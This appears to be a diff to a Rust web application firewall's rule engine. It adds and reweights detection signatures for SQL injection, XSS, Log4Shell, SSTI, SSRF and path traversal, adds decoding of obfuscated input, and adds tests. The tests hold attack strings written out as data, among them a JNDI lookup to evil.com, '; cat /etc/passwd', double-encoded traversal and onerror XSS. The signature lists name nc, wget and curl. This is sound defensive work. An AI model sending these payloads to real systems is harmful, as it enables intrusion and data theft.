@@ -11,8 +11,8 @@ use super::verdict::{Detection, Hit, RequestSummary};
 /// 高置信特征给到 100(默认即达 block 阈值);模糊特征给较低分,靠累加或 LLM 研判定性。
 const LITERAL_RULES: &[(&str, &str, u32)] = &[
     // ---- SQL 注入 ----
-    ("union select", "SQLi", 100),
-    ("union all select", "SQLi", 100),
+    ("union select", "SQLi", 70),
+    ("union all select", "SQLi", 70),
     ("information_schema", "SQLi", 80),
     ("' or '1'='1", "SQLi", 100),
     ("' or 1=1", "SQLi", 100),
@@ -24,7 +24,7 @@ const LITERAL_RULES: &[(&str, &str, u32)] = &[
     ("benchmark(", "SQLi", 70),
     ("waitfor delay", "SQLi", 80),
     ("load_file(", "SQLi", 80),
-    ("into outfile", "SQLi", 90),
+    ("into outfile", "SQLi", 70),
     ("xp_cmdshell", "SQLi", 100),
     ("' --", "SQLi", 40),
     ("'--", "SQLi", 40),
@@ -50,7 +50,7 @@ const LITERAL_RULES: &[(&str, &str, u32)] = &[
     ("php://filter", "PathTraversal", 90),
     ("file://", "PathTraversal", 60),
     // ---- 命令注入(用较具体的组合以降低误报) ----
-    ("$(", "CommandInjection", 70),
+    ("$(", "CommandInjection", 30),
     ("; cat ", "CommandInjection", 80),
     ("; ls ", "CommandInjection", 70),
     ("| nc ", "CommandInjection", 90),
@@ -60,6 +60,31 @@ const LITERAL_RULES: &[(&str, &str, u32)] = &[
     ("wget http", "CommandInjection", 70),
     ("curl http", "CommandInjection", 60),
     ("; ping ", "CommandInjection", 60),
+    // ---- Log4Shell / JNDI ----
+    ("jndi:ldap", "Log4Shell", 100),
+    ("jndi:rmi", "Log4Shell", 100),
+    ("jndi:dns", "Log4Shell", 100),
+    // ---- SSTI / 表达式注入 ----
+    ("__class__", "SSTI", 80),
+    ("freemarker", "SSTI", 60),
+    ("runtime.getruntime", "SSTI", 90),
+    // ---- 现代 SQLi 报错/盲注函数 ----
+    ("extractvalue(", "SQLi", 90),
+    ("updatexml(", "SQLi", 90),
+    ("procedure analyse", "SQLi", 80),
+    ("order by", "SQLi", 20),
+    // ---- XSS 新向量 ----
+    ("formaction", "XSS", 60),
+    ("srcdoc", "XSS", 60),
+    ("onfocus", "XSS", 50),
+    ("ontoggle", "XSS", 60),
+    ("<img", "XSS", 40),
+    ("<body", "XSS", 40),
+    // ---- SSRF / 危险协议 ----
+    ("dict://", "SSRF", 70),
+    ("gopher://", "SSRF", 80),
+    ("/proc/self/", "PathTraversal", 80),
+    ("web.config", "PathTraversal", 60),
 ];
 
 /// 扫描器/攻击工具的 User-Agent 标识(小写子串)。
@@ -98,11 +123,13 @@ impl RuleEngine {
 
         // 需要上下文的结构化特征(大小写不敏感用 (?i))
         let regex_defs: &[(&str, &str, u32)] = &[
-            (r"(?i)\bunion\b\s+\bselect\b", "SQLi", 100),
+            (r"(?i)\bunion\s+(all\s+)?select\s*(\(|null|\d|@@|\*|[a-z_]+\s*\(|.{0,120}?\bfrom\b)", "SQLi", 100),
             (r"(?i)\bor\b\s+\d+\s*=\s*\d+", "SQLi", 90),
             (r"(?i)<\s*script", "XSS", 90),
-            (r"(?i)\bon\w+\s*=", "XSS", 60),
+            (r"(?i)<[a-z][^>]{0,200}?\bon[a-z]+\s*=", "XSS", 80),
             (r"(?:%2e%2e|\.\.)[/\\]", "PathTraversal", 50),
+            (r"(?i)\$\{jndi:(ldap|rmi|dns|iiop)", "Log4Shell", 100),
+            (r"(?i)(select|and|or)\s+.{0,60}?(sleep|benchmark|waitfor)\s*\(", "SQLi", 80),
         ];
         let regexes = regex_defs
             .iter()
@@ -120,10 +147,15 @@ impl RuleEngine {
     pub fn inspect(&self, req: &RequestSummary) -> Detection {
         let mut det = Detection::default();
 
-        // 组合待检字符串:原始 + URL 解码。两者都扫,兼顾明文与百分号编码 payload。
-        let raw = format!("{} {} {}", req.path, req.query, req.body);
+        // 组合待检字符串:原始 + 迭代 URL 解码 + 转义归一。
+        // 三条都扫,兼顾明文、百分号编码、JS/HTML 实体编码等多种混淆。
+        let raw = format!(
+            "{} {} {} {}",
+            req.path, req.query, req.body, req.headers
+        );
         let decoded = percent_decode_lossy(&raw);
-        let haystacks = [raw.as_str(), decoded.as_str()];
+        let fully = decode_escapes(&decoded);
+        let haystacks = [raw.as_str(), decoded.as_str(), fully.as_str()];
 
         // 用类别去重命中:同一 (类别, 模式) 只记一次,避免"原始+解码"重复计分。
         let mut seen: Vec<(String, String)> = Vec::new();
@@ -195,9 +227,28 @@ fn record(
     });
 }
 
-/// 单遍百分号解码(`%XX` → 字节)并把 `+` 归一为空格(表单 urlencoded 语义)。
-/// 非法序列原样保留。仅用于检测归一化,不要求严格 RFC。
+/// 迭代百分号解码:对 `%XX` 最多解码 3 次,用于抓 %252f→%2f→/ 这类双重编码。
+/// 每次若解码后字符串变短(说明有 `%XX` 被还原)就继续;`+` → 空格语义不变。
+/// 仅用于检测归一化,不要求严格 RFC。
 fn percent_decode_lossy(input: &str) -> String {
+    let mut result = single_percent_decode(input);
+    // 已做 1 遍,最多再 2 遍(共 3 遍)
+    for _ in 0..2 {
+        if !result.contains('%') {
+            break;
+        }
+        let next = single_percent_decode(&result);
+        if next.len() < result.len() {
+            result = next;
+        } else {
+            break;
+        }
+    }
+    result
+}
+
+/// 单遍百分号解码,不改变函数签名。
+fn single_percent_decode(input: &str) -> String {
     let bytes = input.as_bytes();
     let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
     let mut i = 0;
@@ -216,6 +267,99 @@ fn percent_decode_lossy(input: &str) -> String {
     String::from_utf8_lossy(&out).into_owned()
 }
 
+/// 转义序列无损解码,全部小写不敏感。支持:
+/// - `\xHH`(两位十六进制)→ 对应字节字符,如 `\x65` → `e`
+/// - `\uHHHH`(四位十六进制)→ 对应 Unicode 字符,如 `\u0065` → `e`
+/// - `&#DD;`(十进制,1-7 位)→ 对应字符,如 `&#97;` → `a`
+/// - `&#xHH;`(十六进制)→ 对应字符,如 `&#x41;` → `A`
+/// 非法/不完整序列原样保留(用 char::from_u32 处理码点,失败则跳过)。
+fn decode_escapes(input: &str) -> String {
+    let bytes = input.as_bytes();
+    let mut out = String::with_capacity(bytes.len());
+    let mut i = 0;
+    while i < bytes.len() {
+        // 尝试 \xHH(大小写不敏感)
+        if bytes[i] == b'\\' && i + 3 < bytes.len() && bytes[i + 1].to_ascii_lowercase() == b'x' {
+            if let (Some(h), Some(l)) = (hex_val(bytes[i + 2]), hex_val(bytes[i + 3])) {
+                out.push((h * 16 + l) as char);
+                i += 4;
+                continue;
+            }
+        }
+        // 尝试 \uHHHH(大小写不敏感)
+        if bytes[i] == b'\\' && i + 5 < bytes.len() && bytes[i + 1].to_ascii_lowercase() == b'u' {
+            if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
+                hex_val(bytes[i + 2]),
+                hex_val(bytes[i + 3]),
+                hex_val(bytes[i + 4]),
+                hex_val(bytes[i + 5]),
+            ) {
+                let cp = (h1 as u32) * 0x1000
+                    + (h2 as u32) * 0x0100
+                    + (h3 as u32) * 0x0010
+                    + (h4 as u32);
+                if let Some(c) = char::from_u32(cp) {
+                    out.push(c);
+                    i += 6;
+                    continue;
+                }
+            }
+        }
+        // 尝试 &#xHH; 或 &#DD;(大小写不敏感)
+        if bytes[i] == b'&' && i + 3 < bytes.len() && bytes[i + 1] == b'#' {
+            if bytes[i + 2].to_ascii_lowercase() == b'x' {
+                // 十六进制形式 &#xHH;
+                let start = i + 3;
+                let mut j = start;
+                let mut val: u32 = 0;
+                let mut has_digits = false;
+                while j < bytes.len() && bytes[j] != b';' {
+                    if let Some(d) = hex_val(bytes[j]) {
+                        val = val.wrapping_mul(16).wrapping_add(d as u32);
+                        has_digits = true;
+                        j += 1;
+                    } else {
+                        break;
+                    }
+                }
+                if has_digits && j < bytes.len() && bytes[j] == b';' {
+                    if let Some(c) = char::from_u32(val) {
+                        out.push(c);
+                        i = j + 1;
+                        continue;
+                    }
+                }
+            } else {
+                // 十进制形式 &#DD;
+                let start = i + 2;
+                let mut j = start;
+                let mut val: u32 = 0;
+                let mut digits = 0;
+                while j < bytes.len() && bytes[j] != b';' && digits < 7 {
+                    if bytes[j].is_ascii_digit() {
+                        val = val.wrapping_mul(10).wrapping_add((bytes[j] - b'0') as u32);
+                        digits += 1;
+                        j += 1;
+                    } else {
+                        break;
+                    }
+                }
+                if digits > 0 && j < bytes.len() && bytes[j] == b';' {
+                    if let Some(c) = char::from_u32(val) {
+                        out.push(c);
+                        i = j + 1;
+                        continue;
+                    }
+                }
+            }
+        }
+        // 默认:原样保留
+        out.push(bytes[i] as char);
+        i += 1;
+    }
+    out
+}
+
 fn hex_val(b: u8) -> Option<u8> {
     match b {
         b'0'..=b'9' => Some(b - b'0'),
@@ -230,12 +374,23 @@ mod tests {
     use super::*;
 
     fn summary(path: &str, query: &str, body: &str, ua: &str) -> RequestSummary {
+        summary_with_headers(path, query, body, ua, "")
+    }
+
+    fn summary_with_headers(
+        path: &str,
+        query: &str,
+        body: &str,
+        ua: &str,
+        headers: &str,
+    ) -> RequestSummary {
         RequestSummary {
             method: "GET".into(),
             path: path.into(),
             query: query.into(),
             user_agent: ua.into(),
             body: body.into(),
+            headers: headers.into(),
             client_ip: "127.0.0.1".into(),
         }
     }
@@ -301,5 +456,173 @@ mod tests {
         let e = RuleEngine::new();
         let d = e.inspect(&summary("/ping", "host=127.0.0.1; cat /etc/passwd", "", ""));
         assert!(d.score >= 80, "命令注入应命中: {:?}", d.hits);
+    }
+
+    #[test]
+    fn payload_in_referer_header_detected() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary_with_headers(
+            "/",
+            "",
+            "",
+            "",
+            "Referer: http://x/?q=<script>alert(1)</script>",
+        ));
+        let xss_hits: Vec<_> = d.hits.iter().filter(|h| h.category == "XSS").collect();
+        assert!(
+            !xss_hits.is_empty(),
+            "Referer 头中的 XSS payload 应被检出: {:?}",
+            d.hits
+        );
+        assert!(
+            d.score >= 90,
+            "得分应达拦截线,实际 {}: {:?}",
+            d.score,
+            d.hits
+        );
+    }
+
+    #[test]
+    fn benign_on_params_score_zero() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("/search", "one=1&only=true&onload_time=5&OneJS=x", "", ""));
+        assert_eq!(d.score, 0, "普通参数名不应被 on* 正则误伤: {:?}", d.hits);
+    }
+
+    #[test]
+    fn xss_event_handler_in_tag_blocks() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("/search", "q=<img src=x onerror=alert(1)>", "", ""));
+        assert!(d.score >= 100, "HTML 标签内的 onerror 应达拦截线: {:?}", d.hits);
+        assert_eq!(d.primary_threat().as_deref(), Some("XSS"));
+    }
+
+    #[test]
+    fn sqli_mention_not_blocked() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("/search", "q=union select 怎么用", "", ""));
+        assert!(d.score < 100, "纯文本提及 union select 不应直接拦截: {:?}", d.hits);
+    }
+
+    #[test]
+    fn sqli_real_union_blocks() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("/items", "q=1 union select 1,2,3 from users", "", ""));
+        assert!(d.score >= 100, "真实 UNION SELECT 注入应达拦截线: {:?}", d.hits);
+        assert_eq!(d.primary_threat().as_deref(), Some("SQLi"));
+    }
+
+    #[test]
+    fn double_urlencoded_traversal_detected() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary(
+            "/download",
+            "file=..%252f..%252f..%252fetc/passwd",
+            "",
+            "",
+        ));
+        assert!(
+            d.score >= 50,
+            "双重编码路径穿越应被迭代解码后命中: {:?}",
+            d.hits
+        );
+        assert_eq!(d.primary_threat().as_deref(), Some("PathTraversal"));
+    }
+
+    #[test]
+    fn hex_escaped_eval_normalized() {
+        assert_eq!(
+            decode_escapes("\\x65\\x76\\x61\\x6c"),
+            "eval",
+            "\\x 十六进制转义应解码为 eval"
+        );
+    }
+
+    #[test]
+    fn html_entity_javascript_detected() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("/search", "x=j&#97;vascript:alert(1)", "", ""));
+        let xss_hits: Vec<_> = d.hits.iter().filter(|h| h.category == "XSS").collect();
+        assert!(
+            !xss_hits.is_empty(),
+            "HTML 实体解码后应命中 javascript: 规则: {:?}",
+            d.hits
+        );
+        assert!(
+            d.score >= 70,
+            "HTML 实体解码后得分应达 70(javascript:), 实际 {}: {:?}",
+            d.score,
+            d.hits
+        );
+    }
+
+    #[test]
+    fn decode_escapes_invalid_sequences_preserved() {
+        // 非法十六进制保留
+        assert_eq!(decode_escapes("\\xZZ"), "\\xZZ");
+        // 空实体保留
+        assert_eq!(decode_escapes("&#;"), "&#;");
+        // 不完整序列保留
+        assert_eq!(decode_escapes("\\x"), "\\x");
+        assert_eq!(decode_escapes("\\u00"), "\\u00");
+        // &#x 无数字保留
+        assert_eq!(decode_escapes("&#x;"), "&#x;");
+        // &# 无数字无分号保留
+        assert_eq!(decode_escapes("&#"), "&#");
+        // \u 大写也应解码
+        assert_eq!(decode_escapes("\\U0065"), "e");
+        // &#x 大写 X 解码
+        assert_eq!(decode_escapes("&#X41;"), "A");
+    }
+
+    #[test]
+    fn log4shell_jndi_blocks() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("", "x=${jndi:ldap://evil.com/a}", "", ""));
+        assert!(
+            d.score >= 100,
+            "Log4Shell JNDI 注入应达拦截线: {:?}",
+            d.hits
+        );
+        assert_eq!(d.primary_threat().as_deref(), Some("Log4Shell"));
+    }
+
+    #[test]
+    fn ssti_expression_detected() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("", "name=1&x=__class__", "", ""));
+        assert!(
+            d.score >= 40,
+            "SSTI __class__ 应被检出: {:?}",
+            d.hits
+        );
+    }
+
+    #[test]
+    fn sqli_extractvalue_blocks() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary(
+            "",
+            "id=1 and extractvalue(1,concat(0x7e,version()))",
+            "",
+            "",
+        ));
+        assert!(
+            d.score >= 90,
+            "extractvalue 报错注入应达拦截线: {:?}",
+            d.hits
+        );
+    }
+
+    #[test]
+    fn xss_img_onerror_new_vector() {
+        let e = RuleEngine::new();
+        let d = e.inspect(&summary("", "x=<img src=x onerror=alert(1)>", "", ""));
+        assert!(
+            d.score >= 100,
+            "XSS img onerror 向量应达拦截线: {:?}",
+            d.hits
+        );
+        assert_eq!(d.primary_threat().as_deref(), Some("XSS"));
     }
 }
